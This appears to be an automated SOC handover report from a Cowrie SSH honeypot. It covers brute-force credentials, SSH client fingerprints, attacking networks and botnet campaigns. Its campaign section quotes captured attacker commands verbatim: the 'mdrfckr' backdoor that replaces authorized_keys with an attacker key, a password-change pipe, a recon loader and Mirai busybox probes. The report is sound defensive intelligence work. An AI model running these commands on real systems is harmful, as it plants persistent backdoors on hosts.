# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-17 |
| **Generated At** | 2026-07-17T10:03:11Z |
| **Shift Time** | 10:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **442** |
| Confirmed Threats | **407** |
| False Positives Filtered | **35** (7.9%) |
| Unique Attacker IPs | **166** |
| Countries of Origin | **35** |
| High Severity Cases | **227** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **215** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **275** |
| Unique Credential Pairs | **157** |
| Unique Usernames | **36** |
| Unique Passwords | **92** |
| Successful Auth Pairs | **242** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 73 |
| `debian` | 24 |
| `admin` | 19 |
| `support` | 16 |
| `nobody` | 16 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `support` | 10 |
| `admin` | 8 |
| `passw0rd` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `support` | `support` | 10 |
| `nobody` | `passw0rd` | 6 |
| `user` | `password123` | 6 |
| `default` | `Default2014` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `administrator` | `passw0rd` | `92.118.39.71` | 2026-07-17T04:55:26 |
| `support` | `support` | `176.53.159.196` | 2026-07-17T04:56:26 |
| `administrator` | `password` | `92.118.39.71` | 2026-07-17T04:56:56 |
| `support` | `support` | `10.0.0.73` | 2026-07-17T04:57:44 |
| `debian` | `000000` | `92.118.39.71` | 2026-07-17T04:58:26 |
| `debian` | `111111` | `92.118.39.71` | 2026-07-17T04:59:55 |
| `debian` | `123` | `92.118.39.71` | 2026-07-17T05:01:24 |
| `debian` | `123123` | `92.118.39.71` | 2026-07-17T05:02:52 |
| `debian` | `1234` | `92.118.39.71` | 2026-07-17T05:04:22 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-17T05:04:26 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-17T05:04:26 |
| `root` | `---fuck_you----` | `223.166.28.162` | 2026-07-17T05:04:59 |
| `debian` | `12345` | `92.118.39.71` | 2026-07-17T05:05:54 |
| `admin` | `admin` | `35.205.107.195` | 2026-07-17T05:06:50 |
| `debian` | `123456` | `92.118.39.71` | 2026-07-17T05:07:25 |
| `root` | `qwerty0` | `10.0.0.73` | 2026-07-17T05:07:48 |
| `debian` | `admin123` | `10.0.0.73` | 2026-07-17T05:08:34 |
| `debian` | `12345678` | `92.118.39.71` | 2026-07-17T05:08:54 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-17T05:09:34 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-17T05:09:34 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-17T05:09:37 |
| `debian` | `123456789` | `92.118.39.71` | 2026-07-17T05:10:23 |
| `root` | `qwerty0` | `185.242.3.195` | 2026-07-17T05:10:53 |
| `123qweASD` | `123qweASD` | `182.75.197.174` | 2026-07-17T05:11:17 |
| `debian` | `1234567890` | `92.118.39.71` | 2026-07-17T05:11:51 |
| `debian` | `123qwe` | `92.118.39.71` | 2026-07-17T05:13:20 |
| `debian` | `1q2w3e4r` | `92.118.39.71` | 2026-07-17T05:14:46 |
| `debian` | `654321` | `92.118.39.71` | 2026-07-17T05:16:15 |
| `debian` | `abc123` | `92.118.39.71` | 2026-07-17T05:17:43 |
| `config` | `444` | `14.33.96.3` | 2026-07-17T05:18:40 |
| `config` | `444` | `218.95.73.31` | 2026-07-17T05:18:51 |
| `debian` | `admin` | `92.118.39.71` | 2026-07-17T05:19:14 |
| `said` | `said` | `164.92.96.91` | 2026-07-17T05:19:52 |
| `345gs5662d34` | `345gs5662d34` | `164.92.96.91` | 2026-07-17T05:19:54 |
| `said` | `3245gs5662d34` | `164.92.96.91` | 2026-07-17T05:19:54 |
| `debian` | `admin123` | `92.118.39.71` | 2026-07-17T05:20:45 |
| `config` | `444` | `218.26.205.154` | 2026-07-17T05:21:50 |
| `config` | `444` | `42.200.60.186` | 2026-07-17T05:22:04 |
| `debian` | `password` | `92.118.39.71` | 2026-07-17T05:22:16 |
| `debian` | `qwerty` | `92.118.39.71` | 2026-07-17T05:23:47 |
| `guest` | `111111` | `92.118.39.71` | 2026-07-17T05:25:17 |
| `guest` | `123` | `92.118.39.71` | 2026-07-17T05:26:43 |
| `guest` | `1234` | `92.118.39.71` | 2026-07-17T05:28:11 |
| `default` | `Default2014` | `14.153.235.88` | 2026-07-17T05:29:32 |
| `guest` | `12345` | `92.118.39.71` | 2026-07-17T05:29:40 |
| `default` | `Default2014` | `14.98.28.43` | 2026-07-17T05:29:41 |
| `guest` | `123456` | `92.118.39.71` | 2026-07-17T05:31:09 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `216.218.206.67` | 2026-07-17T05:31:41 |
| `guest` | `123456789` | `92.118.39.71` | 2026-07-17T05:32:41 |
| `default` | `Default2014` | `222.190.110.210` | 2026-07-17T05:32:57 |
| `default` | `Default2014` | `10.0.0.73` | 2026-07-17T05:33:14 |
| `guest` | `1234567890` | `92.118.39.71` | 2026-07-17T05:34:12 |
| `guest` | `123qwe` | `92.118.39.71` | 2026-07-17T05:35:46 |
| `guest` | `1q2w3e4r` | `92.118.39.71` | 2026-07-17T05:37:21 |
| `guest` | `admin` | `92.118.39.71` | 2026-07-17T05:38:52 |
| `operator` | `66666` | `213.230.124.17` | 2026-07-17T05:39:35 |
| `guest` | `password` | `92.118.39.71` | 2026-07-17T05:40:25 |
| `guest` | `qwerty` | `92.118.39.71` | 2026-07-17T05:41:58 |
| `guest` | `welcome` | `92.118.39.71` | 2026-07-17T05:43:32 |
| `support` | `abc123` | `223.82.97.51` | 2026-07-17T05:43:35 |
| `support` | `abc123` | `125.19.244.62` | 2026-07-17T05:43:44 |
| `newuser` | `123` | `92.118.39.71` | 2026-07-17T05:45:06 |
| `root` | `qwe123!@` | `103.189.234.96` | 2026-07-17T05:45:34 |
| `345gs5662d34` | `345gs5662d34` | `103.189.234.96` | 2026-07-17T05:45:38 |
| `root` | `3245gs5662d34` | `103.189.234.96` | 2026-07-17T05:45:40 |
| `newuser` | `123123` | `92.118.39.71` | 2026-07-17T05:46:40 |
| `support` | `abc123` | `210.13.99.66` | 2026-07-17T05:47:06 |
| `root` | `54321` | `185.242.3.195` | 2026-07-17T05:47:25 |
| `support` | `abc123` | `10.0.0.73` | 2026-07-17T05:47:30 |
| `newuser` | `1234` | `92.118.39.71` | 2026-07-17T05:48:19 |
| `tw` | `tw` | `20.204.3.211` | 2026-07-17T05:48:35 |
| `345gs5662d34` | `345gs5662d34` | `20.204.3.211` | 2026-07-17T05:48:38 |
| `tw` | `3245gs5662d34` | `20.204.3.211` | 2026-07-17T05:48:40 |
| `root` | `1234abcdABCD` | `182.43.221.112` | 2026-07-17T05:49:33 |
| `tao` | `tao@123` | `47.254.74.209` | 2026-07-17T05:49:58 |
| `345gs5662d34` | `345gs5662d34` | `47.254.74.209` | 2026-07-17T05:50:00 |
| `tao` | `3245gs5662d34` | `47.254.74.209` | 2026-07-17T05:50:00 |
| `newuser` | `12345` | `92.118.39.71` | 2026-07-17T05:50:00 |
| `dockeruser` | `123` | `160.251.202.248` | 2026-07-17T05:50:42 |
| `345gs5662d34` | `345gs5662d34` | `160.251.202.248` | 2026-07-17T05:50:45 |
| `dockeruser` | `3245gs5662d34` | `160.251.202.248` | 2026-07-17T05:50:47 |
| `newuser` | `123456` | `92.118.39.71` | 2026-07-17T05:51:41 |
| `newuser` | `12345678` | `92.118.39.71` | 2026-07-17T05:53:20 |
| `newuser` | `123456789` | `92.118.39.71` | 2026-07-17T05:55:03 |
| `newuser` | `1q2w3e4r` | `92.118.39.71` | 2026-07-17T05:56:48 |
| `config` | `111111` | `220.132.170.64` | 2026-07-17T05:57:56 |
| `config` | `111111` | `111.70.32.53` | 2026-07-17T05:58:05 |
| `config` | `111111` | `10.0.0.73` | 2026-07-17T05:58:19 |
| `newuser` | `admin` | `92.118.39.71` | 2026-07-17T05:58:33 |
| `newuser` | `admin123` | `92.118.39.71` | 2026-07-17T06:00:22 |
| `root` | `54321` | `10.0.0.73` | 2026-07-17T06:01:46 |
| `newuser` | `password` | `92.118.39.71` | 2026-07-17T06:02:11 |
| `newuser` | `qwerty` | `92.118.39.71` | 2026-07-17T06:03:57 |
| `eric` | `eric` | `182.76.36.62` | 2026-07-17T06:04:42 |
| `eric` | `eric` | `60.174.39.82` | 2026-07-17T06:04:56 |
| `newuser` | `welcome` | `92.118.39.71` | 2026-07-17T06:05:37 |
| `oracle` | `123` | `92.118.39.71` | 2026-07-17T06:07:15 |
| `oracle` | `1234` | `92.118.39.71` | 2026-07-17T06:08:54 |
| `oracle` | `12345` | `92.118.39.71` | 2026-07-17T06:10:35 |
| `oracle` | `123456` | `92.118.39.71` | 2026-07-17T06:12:13 |
| `install` | `install` | `10.0.0.73` | 2026-07-17T06:12:23 |
| `oracle` | `12345678` | `92.118.39.71` | 2026-07-17T06:13:56 |
| `oracle` | `123456789` | `92.118.39.71` | 2026-07-17T06:15:33 |
| `oracle` | `admin` | `92.118.39.71` | 2026-07-17T06:17:02 |
| `root` | `debian` | `101.36.228.201` | 2026-07-17T06:18:00 |
| `oracle` | `admin123` | `92.118.39.71` | 2026-07-17T06:18:31 |
| `root` | `raspberry` | `203.192.211.180` | 2026-07-17T06:19:39 |
| `root` | `raspberry` | `196.216.81.126` | 2026-07-17T06:19:48 |
| `oracle` | `password` | `92.118.39.71` | 2026-07-17T06:20:01 |
| `root` | `raspberry` | `117.2.123.19` | 2026-07-17T06:22:54 |
| `test` | `3` | `10.0.0.73` | 2026-07-17T06:29:58 |
| `code` | `123` | `112.219.151.50` | 2026-07-17T06:34:07 |
| `345gs5662d34` | `345gs5662d34` | `112.219.151.50` | 2026-07-17T06:34:11 |
| `code` | `3245gs5662d34` | `112.219.151.50` | 2026-07-17T06:34:12 |
| `admin` | `Administrator` | `65.20.250.180` | 2026-07-17T06:37:06 |
| `admin` | `Administrator` | `220.180.171.157` | 2026-07-17T06:37:18 |
| `ubuntu` | `p@ssword` | `185.242.3.195` | 2026-07-17T06:40:54 |
| `testuser` | `testuser` | `90.230.168.26` | 2026-07-17T06:44:27 |
| `testuser` | `testuser` | `120.234.232.184` | 2026-07-17T06:44:35 |
| `testuser` | `testuser` | `50.188.204.213` | 2026-07-17T06:47:58 |
| `root` | `` | `156.226.175.58` | 2026-07-17T06:49:06 |
| `root` | `!root` | `2.57.122.168` | 2026-07-17T06:51:08 |
| `user` | `123qwe` | `138.219.13.21` | 2026-07-17T06:51:09 |
| `root` | `111111` | `2.57.122.168` | 2026-07-17T06:53:41 |
| `user` | `123qwe` | `45.181.101.95` | 2026-07-17T06:54:40 |
| `user` | `123qwe` | `117.252.93.114` | 2026-07-17T06:54:53 |
| `ubuntu` | `p@ssword` | `10.0.0.73` | 2026-07-17T06:54:55 |
| `root` | `123123` | `2.57.122.168` | 2026-07-17T06:56:12 |
| `root` | `123321` | `2.57.122.168` | 2026-07-17T06:58:42 |
| `admin` | `Huawei@123` | `211.169.212.206` | 2026-07-17T06:58:47 |
| `admin` | `Huawei@123` | `24.97.253.246` | 2026-07-17T06:58:54 |
| `root` | `1234` | `2.57.122.168` | 2026-07-17T07:01:09 |
| `admin` | `Huawei@123` | `10.0.0.73` | 2026-07-17T07:02:29 |
| `root` | `12345` | `2.57.122.168` | 2026-07-17T07:03:34 |
| `root` | `1234567` | `2.57.122.168` | 2026-07-17T07:08:19 |
| `root` | `12345678` | `2.57.122.168` | 2026-07-17T07:10:53 |
| `nobody` | `passw0rd` | `103.83.23.169` | 2026-07-17T07:11:18 |
| `nobody` | `passw0rd` | `125.139.124.120` | 2026-07-17T07:11:28 |
| `centos` | `p@ssw0rd` | `116.7.248.50` | 2026-07-17T07:13:02 |
| `centos` | `p@ssw0rd` | `46.201.247.21` | 2026-07-17T07:13:11 |
| `centos` | `p@ssw0rd` | `10.0.0.73` | 2026-07-17T07:13:21 |
| `root` | `123456789` | `2.57.122.168` | 2026-07-17T07:13:31 |
| `nobody` | `passw0rd` | `177.174.105.113` | 2026-07-17T07:14:37 |
| `nobody` | `passw0rd` | `178.178.222.59` | 2026-07-17T07:14:46 |
| `nobody` | `passw0rd` | `10.0.0.73` | 2026-07-17T07:15:02 |
| `root` | `1234567890` | `2.57.122.168` | 2026-07-17T07:16:08 |
| `root` | `123456a` | `2.57.122.168` | 2026-07-17T07:18:51 |
| `user` | `P@ssw0rd` | `83.239.0.202` | 2026-07-17T07:19:32 |
| `user` | `P@ssw0rd` | `185.112.148.66` | 2026-07-17T07:19:40 |
| `user` | `P@ssw0rd` | `10.0.0.73` | 2026-07-17T07:20:01 |
| `root` | `123456b` | `2.57.122.168` | 2026-07-17T07:21:21 |
| `tunnel` | `test` | `14.103.120.75` | 2026-07-17T07:22:06 |
| `demo` | `demo` | `217.150.37.249` | 2026-07-17T07:23:40 |
| `root` | `1234abcd` | `2.57.122.168` | 2026-07-17T07:23:45 |
| `root` | `123abc` | `2.57.122.168` | 2026-07-17T07:26:11 |
| `demo` | `demo` | `121.178.185.141` | 2026-07-17T07:27:14 |
| `demo` | `demo` | `61.12.86.90` | 2026-07-17T07:27:27 |
| `root` | `123qwe` | `2.57.122.168` | 2026-07-17T07:29:13 |
| `root` | `1q2w3e4r` | `2.57.122.168` | 2026-07-17T07:32:33 |
| `git` | `Git@2025` | `203.145.143.163` | 2026-07-17T07:33:00 |
| `345gs5662d34` | `345gs5662d34` | `203.145.143.163` | 2026-07-17T07:33:04 |
| `git` | `3245gs5662d34` | `203.145.143.163` | 2026-07-17T07:33:06 |
| `root` | `P@ssw0rd02` | `185.242.3.195` | 2026-07-17T07:34:03 |
| `nobody` | `p@ssw0rd` | `103.174.80.40` | 2026-07-17T07:35:49 |
| `root` | `1qaz2wsx` | `2.57.122.168` | 2026-07-17T07:35:58 |
| `root` | `key` | `159.89.109.165` | 2026-07-17T07:36:09 |
| `345gs5662d34` | `345gs5662d34` | `159.89.109.165` | 2026-07-17T07:36:11 |
| `root` | `3245gs5662d34` | `159.89.109.165` | 2026-07-17T07:36:12 |
| `root` | `Zv@12345678` | `179.179.199.138` | 2026-07-17T07:38:04 |
| `345gs5662d34` | `345gs5662d34` | `179.179.199.138` | 2026-07-17T07:38:07 |
| `test` | `1234567890` | `87.103.126.54` | 2026-07-17T07:38:07 |
| `root` | `3245gs5662d34` | `179.179.199.138` | 2026-07-17T07:38:08 |
| `root` | `1qaz@WSX` | `2.57.122.168` | 2026-07-17T07:39:24 |
| `nobody` | `p@ssw0rd` | `10.0.0.73` | 2026-07-17T07:39:33 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-17T07:39:55 |
| `root` | `21` | `2.57.122.168` | 2026-07-17T07:42:24 |
| `root` | `r0ot` | `113.11.34.221` | 2026-07-17T07:44:40 |
| `root` | `r0ot` | `60.166.8.174` | 2026-07-17T07:44:50 |
| `root` | `r0ot` | `10.0.0.73` | 2026-07-17T07:45:00 |
| `root` | `321` | `2.57.122.168` | 2026-07-17T07:45:11 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-17T07:45:34 |
| `root` | `P@ssw0rd02` | `10.0.0.73` | 2026-07-17T07:48:05 |
| `root` | `4321` | `2.57.122.168` | 2026-07-17T07:48:26 |
| `test` | `123321` | `122.170.97.94` | 2026-07-17T07:48:48 |
| `test` | `123321` | `202.129.35.8` | 2026-07-17T07:49:01 |
| `root` | `54321` | `2.57.122.168` | 2026-07-17T07:51:04 |
| `test` | `123321` | `197.155.225.93` | 2026-07-17T07:52:09 |
| `test` | `123321` | `10.0.0.73` | 2026-07-17T07:52:32 |
| `root` | `555555` | `2.57.122.168` | 2026-07-17T07:53:33 |
| `root` | `654321` | `2.57.122.168` | 2026-07-17T07:56:18 |
| `root` | `7777777` | `2.57.122.168` | 2026-07-17T07:59:20 |
| `Test` | `0000000` | `221.199.172.66` | 2026-07-17T07:59:39 |
| `Test` | `0000000` | `106.245.246.26` | 2026-07-17T07:59:48 |
| `root` | `ubuntu` | `178.128.183.16` | 2026-07-17T08:00:49 |
| `Test` | `0000000` | `10.0.0.73` | 2026-07-17T08:03:21 |
| `b'\x16\x03\x03\x02c\x01\x00\x02_\x03\x03\xcc\xe5"\xbbIM\x1a\xf00a\x0bi\xe1p\xb4\xf2\xf5x\xcb-'` | `b'">$\xf3PC\xd3sp|m \xc9]\xdc\x1f\xf7\xed\x84\r\xfb\xdc\xac\x0e3\xf4\xdf=<n\x9dm`0\x1d\x08\xf4\x07=\x87:822\x00\x8a\x00\x16\x003\x00g\xc0\x9e\xc0\xa2\x00\x9e\x009\x00k\xc0\x9f\xc0\xa3\x00\x9f\x00E\x00\xbe\x00\x88\x00\xc4\x00\x9a\xc0\x08\xc0\t\xc0#\xc0\xac\xc0\xae\xc0+\xc0'` | `91.230.168.252` | 2026-07-17T08:03:25 |
| `b"\xc0$\xc0\xad\xc0\xaf\xc0,\xc0r\xc0s\xcc\xa9\x13\x02\x13\x01\xcc\x14\xc0\x07\xc0\x12\xc0\x13\xc0'\xc0/\xc0\x14\xc0(\xc00\xc0`\xc0a\xc0v\xc0w\xcc\xa8\x13\x05\x13\x04\x13\x03\xcc\x13\xc0\x11\x00"` | `b'\x00/\x00<\xc0\x9c\xc0\xa0\x00\x9c\x005\x00=\xc0\x9d\xc0\xa1\x00\x9d\x00A\x00\xba\x00\x84\x00\xc0\x00\x07\x00\x04\x00\x05\x01\x00\x01\x8c\x00\x00\x00\x13\x00\x11\x00\x00\x0e129.80.119.236\x00\x0b\x00\x04\x03\x00\x01\x02\x00'` | `91.230.168.252` | 2026-07-17T08:03:25 |
| `  ` | `      #               0 .	` | `91.230.168.252` | 2026-07-17T08:03:25 |
| `nobody` | `qwerty1` | `10.0.0.73` | 2026-07-17T08:03:46 |
| `root` | `12qwaszx` | `117.205.2.250` | 2026-07-17T08:06:08 |
| `root` | `12qwaszx` | `179.185.1.97` | 2026-07-17T08:06:16 |
| `root` | `12qwaszx` | `62.122.195.14` | 2026-07-17T08:09:22 |
| `root` | `12qwaszx` | `217.52.226.144` | 2026-07-17T08:09:33 |
| `debian` | `1q2w3e` | `223.100.248.64` | 2026-07-17T08:13:36 |
| `root` | `passwordlinux` | `35.207.202.141` | 2026-07-17T08:15:33 |
| `345gs5662d34` | `345gs5662d34` | `35.207.202.141` | 2026-07-17T08:15:37 |
| `root` | `3245gs5662d34` | `35.207.202.141` | 2026-07-17T08:15:39 |
| `pedrito` | `pedrito` | `45.4.179.4` | 2026-07-17T08:15:44 |
| `345gs5662d34` | `345gs5662d34` | `45.4.179.4` | 2026-07-17T08:15:47 |
| `pedrito` | `3245gs5662d34` | `45.4.179.4` | 2026-07-17T08:15:47 |
| `debian` | `1q2w3e` | `203.110.233.225` | 2026-07-17T08:17:05 |
| `debian` | `1q2w3e` | `153.37.177.219` | 2026-07-17T08:17:19 |
| `debian` | `1q2w3e` | `10.0.0.73` | 2026-07-17T08:17:28 |
| `root` | `Zz@123123` | `171.25.158.58` | 2026-07-17T08:17:40 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.58` | 2026-07-17T08:17:43 |
| `root` | `3245gs5662d34` | `171.25.158.58` | 2026-07-17T08:17:43 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `172.235.41.245` | 2026-07-17T08:23:00 |
| `admin` | `222` | `45.236.19.9` | 2026-07-17T08:24:27 |
| `nobody` | `qwerty12345` | `50.217.40.11` | 2026-07-17T08:26:22 |
| `root` | `qq1314520` | `185.242.3.195` | 2026-07-17T08:27:18 |
| `admin` | `222` | `200.37.179.83` | 2026-07-17T08:28:00 |
| `admin` | `222` | `45.178.227.0` | 2026-07-17T08:28:07 |
| `admin` | `222` | `10.0.0.73` | 2026-07-17T08:28:28 |
| `nobody` | `qwerty12345` | `10.0.0.73` | 2026-07-17T08:30:09 |
| `user` | `password123` | `111.70.23.245` | 2026-07-17T08:31:03 |
| `user` | `password123` | `60.191.58.203` | 2026-07-17T08:31:14 |
| `user` | `password123` | `119.200.229.33` | 2026-07-17T08:34:29 |
| `user` | `password123` | `213.230.64.246` | 2026-07-17T08:34:42 |
| `user` | `password123` | `10.0.0.73` | 2026-07-17T08:34:48 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `194.195.210.47` | 2026-07-17T08:37:01 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `45.33.80.243` | 2026-07-17T08:38:48 |
| `root` | `qq1314520` | `10.0.0.73` | 2026-07-17T08:41:17 |
| `support` | `123abc` | `10.0.0.73` | 2026-07-17T08:42:07 |
| `alfalak` | `alfalak` | `103.59.163.132` | 2026-07-17T08:47:14 |
| `345gs5662d34` | `345gs5662d34` | `103.59.163.132` | 2026-07-17T08:47:18 |
| `alfalak` | `3245gs5662d34` | `103.59.163.135` | 2026-07-17T08:47:20 |
| `nobody` | `qwerty123456` | `183.6.118.248` | 2026-07-17T08:50:34 |
| `admin` | `Iberia1234**` | `182.156.35.238` | 2026-07-17T08:52:41 |
| `admin` | `Iberia1234**` | `103.158.138.179` | 2026-07-17T08:52:53 |
| `admin` | `Iberia1234**` | `10.0.0.73` | 2026-07-17T08:52:59 |
| `nobody` | `qwerty123456` | `219.128.15.190` | 2026-07-17T08:53:43 |
| `nobody` | `qwerty123456` | `68.225.58.59` | 2026-07-17T08:53:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **442** |
| Sessions with Fingerprint | **20** |
| Unique HASSH Fingerprints | **20** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 109 |
| OpenSSH | 73 |
| libssh | 42 |
| Paramiko (Python) | 10 |
| Nmap scanner | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 81 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 73 | 72 |
| `f555226df196...` | Mirai/variant | 38 | 15 |
| `a2de0f306611...` | Mirai/variant | 10 | 2 |
| `16443846184e...` | Generic scanner | 9 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 81 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 73 | 72 | Mirai/variant |
| `f555226df196...` | libssh | 38 | 15 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 9 | 1 | Generic scanner |
| `95420f9d932d...` | Go SSH scanner | 6 | 5 | — |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 5 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 79 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "test\nDkPRsU3Ox2F4\nDkPRsU3Ox2F4"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `14.103.120.75`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`, `92.118.39.71`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `156.226.175.58`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **166** |
| Unique ASNs | **85** |
| High-Risk ASNs | **79** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 15 | HIGH |
| `AS22773` | Cox Communications Inc. | 11 | HIGH |
| `AS46562` | Performive LLC | 11 | MEDIUM |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (226)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-205efcb0edfc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:55 |
| **Last Seen** | 2026-07-17 04:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:55:25` | `cowrie.session.connect` |
| `2026-07-17 04:55:25` | `cowrie.client.version` |
| `2026-07-17 04:55:25` | `cowrie.client.kex` |
| `2026-07-17 04:55:26` | `cowrie.login.success` |
| `2026-07-17 04:55:28` | `cowrie.session.params` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.command.success` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.command.input` |
| `2026-07-17 04:55:28` | `cowrie.log.closed` |
| `2026-07-17 04:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
